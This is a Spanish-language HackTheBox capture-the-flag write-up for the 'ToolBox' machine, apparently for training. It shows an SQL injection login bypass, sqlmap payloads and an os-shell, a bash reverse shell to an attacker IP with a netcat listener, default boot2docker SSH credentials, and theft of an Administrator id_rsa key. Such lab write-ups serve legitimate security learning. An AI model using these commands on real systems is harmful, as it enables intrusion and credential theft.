---
title: "ToolBox - THB | by ils00"
author: ils00
categories: [HackTheBox, Fácil]
tags: [web, ejpt, windows, sqli, burpsuie. docker, id_rsa]
render_with_liquid: false
media_subpath: /img_p/toolbox_htb
image:
  path: logo.png
---

Esta es una manera sencilla de resolver la máquina **ToolBox** de **HackTheBox** con categoría **Fácil** en la plataforma.

![](maquina.webp)

## Conocimientos Previos:

Después de saber todo esto, vamos a comenzar!!!

**** ESPERAR 5 MINUTOS ANTES DE EMPEZAR CON LOS ESCANEOS ****

Creamos una jerarquía de directorios para poder tenerlo todo organizado.

![](jerarquia.webp)

## Escaneos de Puertos:

Primeramente, lanzamos una traza ICMP hacia la máquina víctima para ver si nos responde.

![](ping.webp)

Como podemos ver en el TTL nos muestra que es una máquina Windows, debido a que tiene un TTL similar a 128.

Vamos a lanzar el primer escaneo de nmap que nos dará una vista mas o menos a que nos estaremos enfrentando.

`nmap -p- --open -sS -Pn -n -v  --min-rate 5000 IP_VICTUMA -oN Allports `

![](nmap.webp)

Vemos que tenemos varios puertos abiertos.

![](nmap1.webp)

Nos vamos a centrar en los más bajitos en este caso.

Vamos a realizar un escaneo más exhaustivo a los puertos más bajitos.

`nmap -p21,22,135,139,443,445,5985,47001 -sCV IP_VICTIMA -oN Targeted`

![](nmap2.webp)

```console
PORT STATE SERVICE VERSION  
21/tcp open ftp FileZilla ftpd  
| ftp-syst:  
|_ SYST: UNIX emulated by FileZilla  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe  
22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)  
| ssh-hostkey:  
| 2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)  
| 256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)  
|_ 256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
443/tcp open ssl/http Apache httpd 2.4.38 ((Debian))  
|_ssl-date: TLS randomness does not represent time  
|_http-server-header: Apache/2.4.38 (Debian)  
|_http-title: MegaLogistics 
| tls-alpn: 
|_ http/1.1  
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR  
| Not valid before: 2020-02-18T17:45:56  
|_Not valid after: 2021-02-17T17:45:56  
445/tcp open microsoft-ds?  
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:  
| smb2-time:  
| date: 2025-06-07T13:08:37  
|_ start_date: N/A  
| smb2-security-mode:  
| 3:1:1:  
|_ Message signing enabled but not required
```

Vemos varios puertos abiertos, primeramente empezaremos por el más bajito que es el **FTP.**

![](ftp.webp)

Vemos que tenemos la posibilidad de conectarnos de manera anónima y vemos que tenemos un fichero dentro llamado “docker-toolbox.exe” que mas o menos podemos intuir lo que nos podemos encontrar.

![](ftp1.webp)

Entramos de forma anónima y confirmamos que tenemos el ejecutable que nos ha reportado nmap.

![](ftp2.webp)

Efectivamente, tenemos un ejecutable y nada más, así que nos lo llevamos a nuestra máquina mediante el comando **get**.

`get docker-toolbox.exe`

Lo dejamos en una carpeta y seguimos analizando a ver que podemos sacar más.

Viendo mas puertos podemos ver que tenemos el puerto **443** abierto esto significa que podemos tener una web con certificado activo.

Analizando podemos ver que hay un dominio y un subdominio llamado **admin.**

![](443.webp)

Esto nos da una buena pista, así que vamos a añadirlo al fichero host para que nuestro navegador pueda resolver a esos dominios.

![](hosts.webp)

Al acceder al **admin.megalogistic.com**, podemos ver un login.

![](login.webp)

Vamos a ver si podemos evitarlo.

## Explotación I:

Me puse a probar claves por defecto y nada, hasta que me puse a probar con inyección SQL a ver si podía y…

![](dashboard.webp)

He podido acceder al dashboard.

La inyección fue bastante sencillita.

Utilicé esta carga:

`' OR 1=1 --'  `

Esto lo que hace es lo siguiente, la query seria la siguiente:

`SELECT * FROM users WHERE username = <entrada usuario > AND password = <entrada password>;`

Por lo que si introducimos la carga en esa query nos queda lo siguiente:

`SELECT * FROM users WHERE username = " OR 1=1' AND password = X";`

Por lo que le estamos diciendo que como 1=1 es verdadero, la consulta devuelve todos los usuarios de la tabla users, saltándose la verificación real del nombre y la contraseña.

Una vez dentro podemos intentar sacar cualquier información.

No conseguí sacar nada claro, así que retrocedí un paso y volví al inicio de sesión.

## Explotación II:

Vamos a hacer un escaneo con sqlmap a ver que podemos sacar de esto ya que el login es bastante vulnerable.

Empezamos entrado a **Burp Suite** para poder capturar el inicio de sesión con usuario y contraseña aleatorio.

Intercepté la petición y me la guardé en una de mis carpetas de la jerarquía.

![](burp.webp)

Con la herramienta **sqlmap** vamosa realizar el escaneo.

`sqlmap  -r <nombre del fichero> --risk=3 --level=3 --batch --force-ssl`

- **risk=3**: prueba inyecciones más peligrosas (más potentes, pero más intrusivas).
- **level=3**: aumenta la cantidad y variedad de pruebas (más parámetros analizados).
- **batch**: modo automático, sin preguntas (usa respuestas por defecto).
- **force-ssl**: fuerza el uso de HTTPS en las peticiones.

```console
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4252' OR 7178=7178-- epOc&password=admin

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=admin' AND 9500=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (9500=9500) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(113)||CHR(106)||CHR(113)) AS NUMERIC)-- Tpee&password=admin

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=admin';SELECT PG_SLEEP(5)--&password=admin

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=admin' AND 6168=(SELECT 6168 FROM PG_SLEEP(5))-- ixfY&password=admin
---
[16:43:44] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.3.14, Apache 2.4.38
back-end DBMS: PostgreSQL
[16:43:44] [INFO] fetched data logged to text files under '/home/tompare/.local/share/sqlmap/output/admin.megalogistic.com'
[16:43:44] [WARNING] your sqlmap version is outdated
```

Me ha mostrado que el campo username es vulnerable como ya hemos comprobado antes por lo que vamos a intentar ganar acceso al PostgreSQL mediante el comando siguiente:

`sqlmap  -r <nombre del fichero> --risk=3 --level=3 --batch --force-ssl --os-shell`

![](shell.webp)

Nos da la shell interactiva el el sistema remoto, ahora desde esta shell nos mandamos una consola a nuestra máquina de atacante, mediante este comando:

`bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"`

Nos ponemos en escucha con **netcat** por el puerto que hayamos especificado en la carga para la shell.

`nc -lvnp [PORT]`

![](shell2.webp)

![](nc.webp)

Y nos devuelve la shell y vemos la bandera de usuario.

![](user.webp)

## Escalada de Privilegios:

Para realizar la escalada podemos ver primeramente que nos encontramos dentro de un **doker** por lo que no tenemos acceso a la máquina principal.

Lo podemos ver haciendo un **ifconfig**:

![](ipconfig.webp)

Para saber que se está ejecutando por detrás vamos a lanzar el comando **uname -a**.

![](uname.webp)

Y podemos ver que estamos ante un **boot2docker**, por lo que vamos a buscar sobre esto en internet.

Buscando podemos saber que es una pequeña máquina virtual que facilita ejecutar **Docker** en sistemas que no lo soportan nativamente, como **Windows** o **MacOs** antiguos.

Haciendo una búsqueda por internet me doy cuenta de que tiene unas claves de ssh por defecto, así que me decido a probarlas.

![](defecto.webp)

Realizo la conexión a la máquina virtual que en este caso es la **172.17.0.1**.

![](ssh.webp)

![](ssh1.webp)

Estamos dentro del docker.

Analizando el docker podemos ver que hay un directorio llamado **c.**

![](c.webp)

Entramos y…

![](ls.webp)

Entramos en el directorio del **Administrador.**

Y podemos ver la bandera de **root.txt**.

![](root.webp)

Vamos a intentar acceder dentro de la máquina víctima haciendo un pivoting sencillo.

Vamos a ver los directorios ocultos del usuario administrador mediante el comando:

`find / -name id_rsa 2>/dev/null`

Y podemos ver que tiene el **/.ssh/id_rsa**

![](id_rsa.webp)

La vamos a copiar y nos lo llevamos a nuestra máquina atacante y realizaremos una conexión **ssh** y nos identificaremos con el **id_rsa**.

![](id_rsa1.webp)

Le damos permisos y nos conectamos.

chmod 600 id_rsa

`ssh -i id_rsa Administrator@IP_VICTIMA`

Una vez hecho todo esto, estamos dentro.

![](root_.webp)

Lo podemos comprobar mediante un:

`ipconfig /all`

![](condig_root.webp)

Ya hemos **ROOTEADO** la máquina.

## Conclusión:

Es una máquina de nivel fácil bastante sencilla que toca algunos conceptos de certificaciones básicas de ciberseguridad, a mi me ha llevado **1h y 30 min** hacerla.

Un saludo, GOOD HACKING!!!

> *XIII*
